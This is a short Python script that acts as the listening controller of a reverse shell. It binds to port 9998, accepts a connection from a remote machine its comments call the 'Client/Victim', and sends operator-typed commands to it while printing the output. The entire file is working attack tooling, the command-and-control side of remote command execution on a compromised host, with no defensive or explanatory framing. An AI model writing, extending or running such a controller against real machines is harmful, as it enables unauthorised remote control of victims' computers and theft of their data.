import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER =[1,2]
queue = Queue()
all_connections = []
all_addressess = []

# Create a socket ( connects two computer )
def create_socket():
    try:
        global host
        global port
        global s
        host = ''
        port = 9998
        s = socket.socket()
    
    except socket.error as msg:
        print("Socket execution created error {}".format(msg))

#  Binding the socket and listening for connection

def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the Port: {}".format(port))

        s.bind((host,port))
        s.listen(5)
    
    except socket.error as msg:
        print("Socket Binding error {} '\n' Retrying .....".format(msg))
        bind_socket()

#  Establish conection with a Client 

def socket_accept():
    conn , address = s.accept()
    print("Connection has been esablished! IP : {0} | PORT : {1}".format(address[0],str(address[1])))
    send_commands(conn)
    conn.close()

# Send commmand to Client/Victim or a friend

def send_commands(conn):
    while True:
        cmd = input()
        if cmd == "quit":
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_resp = str(conn.recv(1024),"utf-8")
            print("Client Response {}".format(client_resp),end="")

def main():
    create_socket()
    bind_socket()
    socket_accept()

main()